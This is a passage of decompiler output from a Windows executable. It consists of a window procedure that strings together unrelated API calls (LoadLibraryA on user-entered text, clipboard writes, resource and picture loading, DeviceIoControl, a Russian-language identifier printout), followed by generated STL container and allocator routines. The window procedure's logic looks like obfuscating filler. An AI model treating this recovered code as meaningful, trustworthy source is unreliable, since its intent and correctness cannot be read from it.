  {
    v101 = BeginPaint(hWndParent, &Paint);
    GetClientRect(hWndParent, &v106);
    DrawTextA(v101, FileName, -1, &v106, 1u);
    DrawTextA(v101, chText, 60, &v106, 0x24u);
    TextOutA(v101, ::nIDDlgItem, ::y, ::String, c);
    EndPaint(hWndParent, &Paint);
    return 0;
  }
  if ( ::hdc == (HDC)273 )
  {
    if ( wParam == 111 )
    {
      GetWindowTextA(dword_452340, String, 60);
      LibraryA = LoadLibraryA(String);
      GetClientRect(hWndParent, &v106);
      SendMessageA(hWndParent, 0xFu, 0, 0);
    }
    return 0;
  }
  else
  {
    DefWindowProcA(hWndParent, Msg, wParam, v110);
    hDlg = GetDlgItem(::hDlg, ::nIDDlgItem);
    v99 = SendDlgItemMessageA(::hDlg, c, 0x190u, 0, 0);
    nIDDlgItem = (int)::hdc;
    v94 = (LPARAM)malloc(4 * dword_45232C + 64);
    v97 = SendDlgItemMessageA(hDlg, nIDDlgItem, 0x191u, v99, v94);
    v98 = v97 << 8;
    Src = malloc((v97 << 8) + 64);
    memset(Src, 0, v98 + 64);
    v96 = (LPARAM)Src;
    for ( n = 0; n < v97; ++n )
    {
      v91 = SendDlgItemMessageA(hDlg, nIDDlgItem, 0x18Au, *(_DWORD *)(v94 + 4 * n), 0);
      if ( v91 + 2 < v98 )
      {
        v91 = SendDlgItemMessageA(hDlg, nIDDlgItem, 0x189u, *(_DWORD *)(v94 + 4 * n), v96);
        if ( v91 == -1 )
          break;
        *(_BYTE *)(v91 + v96) = 13;
        *(_BYTE *)(v91 + v96 + 1) = 10;
        v96 += v91 + 2;
        v98 -= v91 + 2;
      }
    }
    *(_BYTE *)v96++ = 0;
    if ( ::hdc )
    {
      dwBytes = v96 - (_DWORD)Src;
      hMem = GlobalAlloc(0x42u, v96 - (_DWORD)Src);
      v89 = GlobalLock(hMem);
      memcpy(v89, Src, dwBytes);
      GlobalUnlock(hMem);
      OpenClipboard(hDlg);
      EmptyClipboard();
      SetClipboardData(0xDu, hMem);
      SetClipboardData(1u, hMem);
      CloseClipboard();
      free((void *)v94);
      free(Src);
    }
    cchWideChar = MultiByteToWideChar(0, 0, MultiByteStr, -1, 0, 0);
    lpWideCharStr = SysAllocStringLen(0, cchWideChar - 1);
    MultiByteToWideChar(0, 0, MultiByteStr, -1, lpWideCharStr, cchWideChar);
    if ( (int)v85 >= 0 )
      v85 = (HDC)::nIDDlgItem;
    SysFreeString(lpWideCharStr);
    if ( (int)v85 < 0 )
      v85 = ::hdc;
    v82 = ::hdc;
    v83 = hInstance;
    hResInfo = 0;
    v76 = 0i64;
    hResData = 0;
    hGlobal = 0;
    if ( ::hdc )
    {
      hResInfo = FindResourceA(v83, Name, Type);
      HIDWORD(v76) = SizeofResource(v83, hResInfo);
      hResData = LoadResource(v83, hResInfo);
      LODWORD(v76) = LockResource(hResData);
      hGlobal = GlobalAlloc(0, HIDWORD(v76));
      memcpy(hGlobal, (const void *)v76, HIDWORD(v76));
      v73 = CreateStreamOnHGlobal(hGlobal, 1, &ppstm);
      FreeResource(hResData);
    }
    else
    {
      v73 = SHCreateStreamOnFileA(Name, 0x10u, &ppstm);
    }
    v73 = OleLoadPicture(ppstm, 0, 1, &riid, &lpvObj);
    v74 = 0;
    if ( ::hdc )
    {
      (*(void (__stdcall **)(LPVOID, HANDLE *))(*(_DWORD *)lpvObj + 12))(lpvObj, &v74);
      if ( !GetObjectA(v74, 24, pv) )
        return 0;
      v67 = GetDC(0);
      v65 = CreateCompatibleDC(v67);
      v74 = SelectObject(v65, v74);
      v68 = CreateCompatibleDC(v67);
      CompatibleBitmap = CreateCompatibleBitmap(v67, v70, v71);
      CompatibleBitmap = SelectObject(v68, CompatibleBitmap);
      BitBlt(v68, 0, 0, v70, v71, v65, 0, 0, 0xCC0020u);
      SelectObject(v65, v74);
      CompatibleBitmap = SelectObject(v68, CompatibleBitmap);
      DeleteDC(v65);
      DeleteDC(v68);
      ReleaseDC(0, v67);
      if ( hGlobal )
        GlobalFree(hGlobal);
      (*(void (__stdcall **)(LPVOID))(*(_DWORD *)lpvObj + 8))(lpvObj);
    }
    v60 = 0;
    v63 = 1;
    v58 = 1;
    lpGeoEnumProc = 0;
    hDevice = CreateFileA(FileName, 0, 5u, 0, 3u, 0, 0);
    if ( hDevice == (HANDLE)-1 )
      v60 = v63 + dword_45232C * (_DWORD)lpGeoEnumProc;
    else
      v60 = (int)::hWnd + v58 + ::Y;
    if ( DeviceIoControl(hDevice, 0x900C0u, 0, 0, OutBuffer, 0x40u, &BytesReturned, 0) || !lpGeoEnumProc )
    {
      if ( v60 )
        lpGeoEnumProc = (GEO_ENUMPROC)dword_452068;
      else
        memcpy(&rguid, OutBuffer, sizeof(rguid));
      StringFromGUID2(&rguid, sz, 39);
      EnumSystemGeoID(0x10u, 0, lpGeoEnumProc);
      printf("Глобальный идентификатор: %ws\n", sz);
    }
    CloseHandle(hDevice);
    return 0;
  }
}
// 402B10: using guessed type int dword_402B10[512];
// 423024: using guessed type int __stdcall DWriteCreateFactory(_DWORD, _DWORD, _DWORD);
// 423A88: using guessed type __int16 word_423A88;
// 423AF8: using guessed type wchar_t aVerdana[8];
// 4518F4: using guessed type int dword_4518F4;
// 45206C: using guessed type int dword_45206C;
// 4521AC: using guessed type int dword_4521AC;
// 452300: using guessed type int dword_452300;
// 452308: using guessed type int dword_452308;
// 45230C: using guessed type int dword_45230C;
// 452314: using guessed type int dword_452314;
// 452318: using guessed type int dword_452318;
// 452328: using guessed type int dword_452328;
// 45232C: using guessed type int dword_45232C;
// 45233C: using guessed type int dword_45233C;
// 40589A: using guessed type bool var_368[4];
// 40589A: using guessed type int var_2590[3];
// 40589A: using guessed type _DWORD var_8AC[4];
// 40589A: using guessed type char var_8C0[4];
// 40589A: using guessed type int var_2618[3];
// 40589A: using guessed type LPARAM lParam[5];
// 40589A: using guessed type int var_2568;
// 40589A: using guessed type CHAR chText[180];
// 40589A: using guessed type CHAR Type[264];
// 40589A: using guessed type char pv[4];

//----- (004086FC) --------------------------------------------------------
void *__thiscall sub_4086FC(void *this)
{
  return this;
}

//----- (00408708) --------------------------------------------------------
BOOL __thiscall sub_408708(bool *this, HWND a2)
{
  HDC Path; // [esp+18h] [ebp-1Ch]

  if ( a2 == hWnd )
    Path = (HDC)GetPath(cpt, 0, 0, (int)cpt);
  else
    Path = cpt;
  *this = (int)Path > 0;
  return *this;
}

//----- (004087BE) --------------------------------------------------------
int __stdcall sub_4087BE(char a1)
{
  unsigned int puiID; // [esp+18h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = 0;
  if ( !a1 )
    return 0;
  puiID = 0;
  return GetActivePwrScheme(&puiID);
}

//----- (00408852) --------------------------------------------------------
void sub_408852()
{
  ;
}

//----- (0040885B) --------------------------------------------------------
_BYTE *__thiscall sub_40885B(_BYTE *this)
{
  sub_4086FC(this);
  this[1] = 1;
  return this;
}

//----- (00408876) --------------------------------------------------------
char __thiscall sub_408876(_BYTE *this, int a2)
{
  this[1] = a2 < (int)cpt && (_DWORD)hWnd * SetCaretBlinkTime(0) != 0;
  return this[1];
}

//----- (004088B5) --------------------------------------------------------
void sub_4088B5()
{
  sub_408852();
}

//----- (004088C6) --------------------------------------------------------
void **__thiscall sub_4088C6(void **this)
{
  sub_408CFA((int)this);
  return sub_409148(this);
}

//----- (00408908) --------------------------------------------------------
void **__thiscall sub_408908(void **this)
{
  sub_409094((int)this);
  return sub_409148(this);
}

//----- (0040894A) --------------------------------------------------------
int __thiscall sub_40894A(void *this)
{
  return sub_408E24((int)this);
}

//----- (00408982) --------------------------------------------------------
int __thiscall sub_408982(int this, _BYTE *a2)
{
  int result; // eax
  _BYTE *v5; // [esp+28h] [ebp-4h]

  if ( (unsigned int)a2 < *(_DWORD *)(this + 4) && *(_DWORD *)this <= (unsigned int)a2 )
  {
    v5 = &a2[-*(_DWORD *)this];
    if ( *(_DWORD *)(this + 4) == *(_DWORD *)(this + 8) )
      sub_408DAE((void **)this, 1);
    sub_409E5B(this + 12, *(_BYTE **)(this + 4), &v5[*(_DWORD *)this]);
    result = *(_DWORD *)(this + 4) + 1;
    *(_DWORD *)(this + 4) = result;
  }
  else
  {
    if ( *(_DWORD *)(this + 4) == *(_DWORD *)(this + 8) )
      sub_408DAE((void **)this, 1);
    sub_409E8B(this + 12, *(_BYTE **)(this + 4), a2);
    result = *(_DWORD *)(this + 4) + 1;
    *(_DWORD *)(this + 4) = result;
  }
  return result;
}

//----- (00408A46) --------------------------------------------------------
int __thiscall sub_408A46(_DWORD *this)
{
  int result; // eax

  result = this[1] == *this;
  if ( this[1] != *this )
  {
    sub_409F91();
    result = this[1] - 1;
    this[1] = result;
  }
  return result;
}

//----- (00408A89) --------------------------------------------------------
int __thiscall sub_408A89(void **this)
{
  int v2; // [esp-4h] [ebp-14h] BYREF
  void **v3; // [esp+4h] [ebp-Ch]
  int *v4; // [esp+8h] [ebp-8h]
  int *v5; // [esp+Ch] [ebp-4h]

  v3 = this;
  v5 = &v2;
  v4 = &v2;
  sub_40961B(this, (int)this);
  return (int)v3;
}

//----- (00408AAB) --------------------------------------------------------
int __thiscall sub_408AAB(_DWORD *this, _WORD *a2)
{
  int result; // eax
  unsigned int v4; // [esp+20h] [ebp-8h]
  unsigned int v5; // [esp+24h] [ebp-4h]

  if ( !((this[4] + this[3]) % 8u) && this[2] <= (unsigned int)(this[4] + 8) >> 3 )
    sub_40928E((int)this, 1u);
  v5 = this[4] + this[3];
  v4 = v5 >> 3;
  if ( this[2] <= v5 >> 3 )
    v4 -= this[2];
  if ( !*(_DWORD *)(this[1] + 4 * v4) )
    *(_DWORD *)(this[1] + 4 * v4) = sub_409FCC(8u);
  sub_409EC1((int)(this + 5), (_WORD *)(*(_DWORD *)(this[1] + 4 * v4) + 2 * (v5 % 8)), a2);
  result = this[4] + 1;
  this[4] = result;
  return result;
}

//----- (00408B83) --------------------------------------------------------
_DWORD *__thiscall sub_408B83(_DWORD *this)
{
  bool v1; // cl
  _DWORD *result; // eax
  unsigned int v3; // ecx
  int v4; // ecx

  v1 = this[4] == 0;
  result = (_DWORD *)v1;
  if ( !v1 )
  {
    sub_409F91();
    v3 = this[3] + 1;
    this[3] = v3;
    if ( 8 * this[2] <= v3 )
      this[3] = 0;
    result = this;
    v4 = this[4] - 1;
    this[4] = v4;
    if ( !v4 )
    {
      result = this;
      this[3] = 0;
    }
  }
  return result;
}

//----- (00408C22) --------------------------------------------------------
int __thiscall sub_408C22(_DWORD *this, _WORD *a2)
{
  int result; // eax
  unsigned int v4; // [esp+20h] [ebp-8h]
  unsigned int v5; // [esp+24h] [ebp-4h]

  if ( !((this[4] + this[3]) % 8u) && this[2] <= (unsigned int)(this[4] + 8) >> 3 )
    sub_40928E((int)this, 1u);
  v5 = this[4] + this[3];
  v4 = v5 >> 3;
  if ( this[2] <= v5 >> 3 )
    v4 -= this[2];
  if ( !*(_DWORD *)(this[1] + 4 * v4) )
    *(_DWORD *)(this[1] + 4 * v4) = sub_409FCC(8u);
  sub_409EF3((int)(this + 5), (_WORD *)(*(_DWORD *)(this[1] + 4 * v4) + 2 * (v5 % 8)), a2);
  result = this[4] + 1;
  this[4] = result;
  return result;
}

//----- (00408CFA) --------------------------------------------------------
int __thiscall sub_408CFA(int this)
{
  int result; // eax
  int v3; // [esp+10h] [ebp-4h]

  while ( *(_DWORD *)(this + 16) )
    sub_4091F3((_DWORD *)this);
  v3 = *(_DWORD *)(this + 8);
  while ( v3 )
  {
    --v3;
    if ( *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v3) )
    {
      operator delete(*(void **)(*(_DWORD *)(this + 4) + 4 * v3));
      sub_409F91();
    }
  }
  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  *(_DWORD *)(this + 8) = 0;
  result = this;
  *(_DWORD *)(this + 4) = 0;
  return result;
}

//----- (00408DAE) --------------------------------------------------------
unsigned int __thiscall sub_408DAE(void **this, int a2)
{
  unsigned int result; // eax
  unsigned int v3; // eax
  unsigned int v5; // [esp+14h] [ebp-4h]
  unsigned int v6; // [esp+14h] [ebp-4h]

  v5 = (_BYTE *)this[1] - (_BYTE *)*this;
  if ( -1 - a2 < v5 )
    std::_Xlength_error("vector<T> too long");
  v6 = a2 + v5;
  result = (_BYTE *)this[2] - (_BYTE *)*this;
  if ( v6 > result )
  {
    v3 = sub_4097E2(this, v6);
    return sub_4096AB(this, v3);
  }
  return result;
}

//----- (00408E24) --------------------------------------------------------
int __thiscall sub_408E24(int this)
{
  int result; // eax

  if ( *(_DWORD *)this )
    operator delete(*(void **)this);
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  result = this;
  *(_DWORD *)(this + 8) = 0;
  return result;
}

//----- (00408E70) --------------------------------------------------------
int __thiscall sub_408E70(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  unsigned int v4; // [esp+20h] [ebp-8h]
  unsigned int v5; // [esp+24h] [ebp-4h]

  if ( !((this[4] + this[3]) % 4u) && this[2] <= (unsigned int)(this[4] + 4) >> 2 )
    sub_40993C((int)this, 1u);
  v5 = this[4] + this[3];
  v4 = v5 >> 2;
  if ( this[2] <= v5 >> 2 )
    v4 -= this[2];
  if ( !*(_DWORD *)(this[1] + 4 * v4) )
    *(_DWORD *)(this[1] + 4 * v4) = sub_40A02A(4u);
  sub_409F2B((int)(this + 5), (_DWORD *)(*(_DWORD *)(this[1] + 4 * v4) + 4 * (v5 % 4)), a2);
  result = this[4] + 1;
  this[4] = result;
  return result;
}

//----- (00408F48) --------------------------------------------------------
int __thiscall sub_408F48(_DWORD *this)
{
  _DWORD *v2; // [esp+4h] [ebp-38h]
  int **v3; // [esp+10h] [ebp-2Ch]
  int v4[3]; // [esp+14h] [ebp-28h] BYREF
  int v5[3]; // [esp+20h] [ebp-1Ch] BYREF
  int v6; // [esp+38h] [ebp-4h]

  v2 = sub_409849(this, v5);
  v6 = 0;
  v3 = (int **)sub_409CC9(v2, v4, 1);
  LOBYTE(v6) = 1;
  return sub_409DD6(v3);
}
// 408F48: using guessed type int var_1C[3];
// 408F48: using guessed type int var_28[3];

//----- (00408FBC) --------------------------------------------------------
int __thiscall sub_408FBC(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  unsigned int v4; // [esp+20h] [ebp-8h]
  unsigned int v5; // [esp+24h] [ebp-4h]

  if ( !((this[4] + this[3]) % 4u) && this[2] <= (unsigned int)(this[4] + 4) >> 2 )
    sub_40993C((int)this, 1u);
  v5 = this[4] + this[3];
  v4 = v5 >> 2;
  if ( this[2] <= v5 >> 2 )
    v4 -= this[2];
  if ( !*(_DWORD *)(this[1] + 4 * v4) )
    *(_DWORD *)(this[1] + 4 * v4) = sub_40A02A(4u);
  sub_409F5B((int)(this + 5), (_DWORD *)(*(_DWORD *)(this[1] + 4 * v4) + 4 * (v5 % 4)), a2);
  result = this[4] + 1;
  this[4] = result;
  return result;
}

//----- (00409094) --------------------------------------------------------
int __thiscall sub_409094(int this)
{
  int result; // eax
  int v3; // [esp+10h] [ebp-4h]

  while ( *(_DWORD *)(this + 16) )
    sub_4098A1((_DWORD *)this);
  v3 = *(_DWORD *)(this + 8);
  while ( v3 )
  {
    --v3;
    if ( *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v3) )
    {
      operator delete(*(void **)(*(_DWORD *)(this + 4) + 4 * v3));
      sub_409F91();
    }
  }
  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  *(_DWORD *)(this + 8) = 0;
  result = this;
  *(_DWORD *)(this + 4) = 0;
  return result;
}

//----- (00409148) --------------------------------------------------------
void **__thiscall sub_409148(void **this)
{
  void **result; // eax

  sub_409F91();
  operator delete(*this);
  result = this;
  *this = 0;
  return result;
}

//----- (004091A1) --------------------------------------------------------
_DWORD *__thiscall sub_4091A1(_DWORD *this, _DWORD *a2)
{
  int v3; // [esp+4h] [ebp-Ch]

  v3 = this[3];
  *a2 = 0;
  a2[1] = 0;
  if ( this )
    *a2 = *this;
  a2[2] = v3;
  return a2;
}

//----- (004091F3) --------------------------------------------------------
_DWORD *__thiscall sub_4091F3(_DWORD *this)
{
  bool v1; // cl
  _DWORD *result; // eax
  int v3; // ecx

  v1 = this[4] == 0;
  result = (_DWORD *)v1;
  if ( !v1 )
  {
    sub_409F91();
    result = this;
    v3 = this[4] - 1;
    this[4] = v3;
    if ( !v3 )
    {
      result = this;
      this[3] = 0;
    }
  }
  return result;
}

//----- (0040928E) --------------------------------------------------------
unsigned int __thiscall sub_40928E(int this, unsigned int a2)
{
  unsigned int result; // eax
  int v4; // [esp+30h] [ebp-84h]
  int v5; // [esp+80h] [ebp-34h]
  char *v6; // [esp+A4h] [ebp-10h]
  char *v7; // [esp+A8h] [ebp-Ch]
  unsigned int v8; // [esp+ACh] [ebp-8h]
  unsigned int v9; // [esp+B0h] [ebp-4h]

  if ( 0xFFFFFFF - *(_DWORD *)(this + 8) < a2 )
    std::_Xlength_error("deque<T> too long");
  v8 = *(_DWORD *)(this + 8) >> 1;
  if ( v8 < 8 )
    v8 = 8;
  if ( a2 < v8 && *(_DWORD *)(this + 8) <= 0xFFFFFFF - v8 )
    a2 = v8;
  v9 = *(_DWORD *)(this + 12) >> 3;
  v6 = (char *)sub_40A02A(a2 + *(_DWORD *)(this + 8));
  v5 = (int)(*(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8) - (*(_DWORD *)(this + 4) + 4 * v9)) >> 2;
  v7 = (char *)memcpy_0(&v6[4 * v9], (const void *)(*(_DWORD *)(this + 4) + 4 * v9), 4 * v5) + 4 * v5;
  if ( v9 > a2 )
  {
    memcpy_0(v7, *(const void **)(this + 4), 4 * ((int)(4 * a2) >> 2));
    v4 = (int)(*(_DWORD *)(this + 4) + 4 * v9 - (*(_DWORD *)(this + 4) + 4 * a2)) >> 2;
    memset((char *)memcpy_0(v6, (const void *)(*(_DWORD *)(this + 4) + 4 * a2), 4 * v4) + 4 * v4, 0, 4 * a2);
  }
  else
  {
    memset(
      (char *)memcpy_0(v7, *(const void **)(this + 4), 4 * ((int)(4 * v9) >> 2)) + 4 * ((int)(4 * v9) >> 2),
      0,
      4 * (a2 - v9));
    memset(v6, 0, 4 * v9);
  }
  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  *(_DWORD *)(this + 4) = v6;
  result = a2 + *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = result;
  return result;
}

//----- (0040961B) --------------------------------------------------------
void **__thiscall sub_40961B(void **this, int a2)
{
  int v4[2]; // [esp+18h] [ebp-18h] BYREF
  char v5; // [esp+23h] [ebp-Dh] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  *this = 0;
  v6 = 0;
  *this = sub_40A0E1(1u);
  v4[0] = 0;
  v4[1] = 0;
  sub_409F96((int)&v5, *this, v4);
  *(_DWORD *)*this = this;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  return this;
}

//----- (004096AB) --------------------------------------------------------
unsigned int __thiscall sub_4096AB(void **this, size_t a2)
{
  unsigned int result; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-5Ch] BYREF
  void **v4; // [esp+10h] [ebp-4Ch]
  int v5; // [esp+14h] [ebp-48h]
  void *v6; // [esp+18h] [ebp-44h]
  char v7; // [esp+1Eh] [ebp-3Eh]
  char v8; // [esp+1Fh] [ebp-3Dh]
  _BYTE *v9; // [esp+20h] [ebp-3Ch]
  void *Src; // [esp+24h] [ebp-38h]
  size_t Size; // [esp+28h] [ebp-34h]
  char v12; // [esp+2Eh] [ebp-2Eh]
  char v13; // [esp+2Fh] [ebp-2Dh]
  int v14; // [esp+40h] [ebp-1Ch]
  int v15; // [esp+44h] [ebp-18h]
  void *v16; // [esp+48h] [ebp-14h]
  _DWORD *v17; // [esp+4Ch] [ebp-10h]
  int v18; // [esp+58h] [ebp-4h]

  v17 = v3;
  v4 = this;
  v14 = -1;
  v3[3] = -1;
  result = (_BYTE *)v4[2] - (_BYTE *)*v4;
  if ( result < a2 )
  {
    v16 = sub_40A089(a2);
    v18 = 0;
    v9 = v4[1];
    Src = *v4;
    v13 = v12;
    Size = v9 - (_BYTE *)Src;
    memcpy_0(v16, Src, v9 - (_BYTE *)Src);
    v18 = -1;
    v15 = (_BYTE *)v4[1] - (_BYTE *)*v4;
    if ( *v4 )
    {
      v8 = v7;
      v5 = (_BYTE *)v4[2] - (_BYTE *)*v4;
      v6 = *v4;
      operator delete(v6);
    }
    v4[2] = (char *)v16 + a2;
    v4[1] = (char *)v16 + v15;
    result = (unsigned int)v4;
    *v4 = v16;
  }
  return result;
}

//----- (004097E2) --------------------------------------------------------
unsigned int __thiscall sub_4097E2(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // [esp+0h] [ebp-14h]
  unsigned int v4; // [esp+10h] [ebp-4h]
  unsigned int v5; // [esp+10h] [ebp-4h]

  v4 = this[2] - *this;
  if ( -1 - (v4 >> 1) >= v4 )
    v3 = v4 + (v4 >> 1);
  else
    v3 = 0;
  v5 = v3;
  if ( v3 < a2 )
    return a2;
  return v5;
}

//----- (00409849) --------------------------------------------------------
_DWORD *__thiscall sub_409849(_DWORD *this, _DWORD *a2)
{
  int v3; // [esp+4h] [ebp-Ch]

  v3 = this[4] + this[3];
  *a2 = 0;
  a2[1] = 0;
  if ( this )
    *a2 = *this;
  a2[2] = v3;
  return a2;
}

//----- (004098A1) --------------------------------------------------------
_DWORD *__thiscall sub_4098A1(_DWORD *this)
{
  bool v1; // cl
  _DWORD *result; // eax
  int v3; // ecx

  v1 = this[4] == 0;
  result = (_DWORD *)v1;
  if ( !v1 )
  {
    sub_409F91();
    result = this;
    v3 = this[4] - 1;
    this[4] = v3;
    if ( !v3 )
    {
      result = this;
      this[3] = 0;
    }
  }
  return result;
}

//----- (0040993C) --------------------------------------------------------
unsigned int __thiscall sub_40993C(int this, unsigned int a2)
{
  unsigned int result; // eax
  int v4; // [esp+30h] [ebp-84h]
  int v5; // [esp+80h] [ebp-34h]
  char *v6; // [esp+A4h] [ebp-10h]
  char *v7; // [esp+A8h] [ebp-Ch]
  unsigned int v8; // [esp+ACh] [ebp-8h]
  unsigned int v9; // [esp+B0h] [ebp-4h]

  if ( 0xFFFFFFF - *(_DWORD *)(this + 8) < a2 )
    std::_Xlength_error("deque<T> too long");
  v8 = *(_DWORD *)(this + 8) >> 1;
  if ( v8 < 8 )
    v8 = 8;
  if ( a2 < v8 && *(_DWORD *)(this + 8) <= 0xFFFFFFF - v8 )
    a2 = v8;
  v9 = *(_DWORD *)(this + 12) >> 2;
  v6 = (char *)sub_40A02A(a2 + *(_DWORD *)(this + 8));
  v5 = (int)(*(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8) - (*(_DWORD *)(this + 4) + 4 * v9)) >> 2;
  v7 = (char *)memcpy_0(&v6[4 * v9], (const void *)(*(_DWORD *)(this + 4) + 4 * v9), 4 * v5) + 4 * v5;
  if ( v9 > a2 )
  {
    memcpy_0(v7, *(const void **)(this + 4), 4 * ((int)(4 * a2) >> 2));
    v4 = (int)(*(_DWORD *)(this + 4) + 4 * v9 - (*(_DWORD *)(this + 4) + 4 * a2)) >> 2;
    memset((char *)memcpy_0(v6, (const void *)(*(_DWORD *)(this + 4) + 4 * a2), 4 * v4) + 4 * v4, 0, 4 * a2);
  }
  else
  {
    memset(
      (char *)memcpy_0(v7, *(const void **)(this + 4), 4 * ((int)(4 * v9) >> 2)) + 4 * ((int)(4 * v9) >> 2),
      0,
      4 * (a2 - v9));
    memset(v6, 0, 4 * v9);
  }
  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  *(_DWORD *)(this + 4) = v6;
  result = a2 + *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = result;
  return result;
}

//----- (00409CC9) --------------------------------------------------------
_DWORD *__thiscall sub_409CC9(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD ***v4; // [esp+Ch] [ebp-18h]
  _DWORD **v5; // [esp+18h] [ebp-Ch]
  int v6; // [esp+20h] [ebp-4h]

  v5 = 0;
  if ( *this )
  {
    v4 = *(_DWORD ****)*this;
    if ( v4 )
      v5 = *v4;
  }
  v6 = this[2] - a3;
  *a2 = 0;
  a2[1] = 0;
  if ( (_DWORD **)*a2 != v5 && *v5 )
    *a2 = **v5;
  a2[2] = v6;
  return a2;
}

//----- (00409D68) --------------------------------------------------------
int __thiscall sub_409D68(int **this)
{
  int v2; // [esp+0h] [ebp-14h]
  unsigned int v3; // [esp+10h] [ebp-4h]

  if ( *this )
    v2 = **this;
  else
    v2 = 0;
  v3 = (unsigned int)this[2] >> 3;
  if ( *(_DWORD *)(v2 + 8) <= v3 )
    v3 -= *(_DWORD *)(v2 + 8);
  return *(_DWORD *)(*(_DWORD *)(v2 + 4) + 4 * v3) + 2 * ((unsigned int)this[2] & 7);
}

//----- (00409DD6) --------------------------------------------------------
int __thiscall sub_409DD6(int **this)
{
  int v2; // [esp+0h] [ebp-14h]
  unsigned int v3; // [esp+10h] [ebp-4h]

  if ( *this )
    v2 = **this;
  else
    v2 = 0;
  v3 = (unsigned int)this[2] >> 2;
  if ( *(_DWORD *)(v2 + 8) <= v3 )
    v3 -= *(_DWORD *)(v2 + 8);
  return *(_DWORD *)(*(_DWORD *)(v2 + 4) + 4 * v3) + 4 * ((unsigned int)this[2] & 3);
}

//----- (00409E44) --------------------------------------------------------
HRESULT __cdecl sub_409E44(D2D1_FACTORY_TYPE factoryType, void **ppIFactory)
{
  return D2D1CreateFactory(factoryType, &stru_423B50, 0, ppIFactory);
}

//----- (00409E5B) --------------------------------------------------------
_BYTE *__cdecl sub_409E5B(int a1, _BYTE *a2, _BYTE *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409E8B) --------------------------------------------------------
_BYTE *__cdecl sub_409E8B(int a1, _BYTE *a2, _BYTE *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409EC1) --------------------------------------------------------
_WORD *__cdecl sub_409EC1(int a1, _WORD *a2, _WORD *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409EF3) --------------------------------------------------------
_WORD *__cdecl sub_409EF3(int a1, _WORD *a2, _WORD *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409F2B) --------------------------------------------------------
_DWORD *__cdecl sub_409F2B(int a1, _DWORD *a2, _DWORD *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409F5B) --------------------------------------------------------
_DWORD *__cdecl sub_409F5B(int a1, _DWORD *a2, _DWORD *a3)
{
  if ( !a2 )
    return 0;
  *a2 = *a3;
  return a2;
}

//----- (00409F91) --------------------------------------------------------
void sub_409F91()
{
  ;
}

//----- (00409F96) --------------------------------------------------------
_DWORD *__cdecl sub_409F96(int a1, _DWORD *a2, _DWORD *a3)
{
  int v3; // eax

  if ( !a2 )
    return 0;
  v3 = a3[1];
  *a2 = *a3;
  a2[1] = v3;
  return a2;
}

//----- (00409FCC) --------------------------------------------------------
void *__cdecl sub_409FCC(unsigned int a1)
{
  char *v2; // [esp+0h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  void *v4; // [esp+10h] [ebp-4h]

  v4 = 0;
  if ( a1 )
  {
    if ( a1 > 0x7FFFFFFF || (v4 = operator new(2 * a1)) == 0 )
    {
      v2 = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v2);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return v4;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (0040A02A) --------------------------------------------------------
void *__cdecl sub_40A02A(unsigned int a1)
{
  char *v2; // [esp+0h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  void *v4; // [esp+10h] [ebp-4h]

  v4 = 0;
  if ( a1 )
  {
    if ( a1 > 0x3FFFFFFF || (v4 = operator new(4 * a1)) == 0 )
    {
      v2 = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v2);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return v4;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (0040A089) --------------------------------------------------------
void *__cdecl sub_40A089(size_t Size)
{
  char *v2; // [esp+0h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  void *v4; // [esp+10h] [ebp-4h]

  v4 = 0;
  if ( Size )
  {
    v4 = operator new(Size);
    if ( !v4 )
    {
      v2 = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v2);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return v4;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (0040A0E1) --------------------------------------------------------
void *__cdecl sub_40A0E1(unsigned int a1)
{
  char *v2; // [esp+0h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  void *v4; // [esp+10h] [ebp-4h]

  v4 = 0;
  if ( a1 )
  {
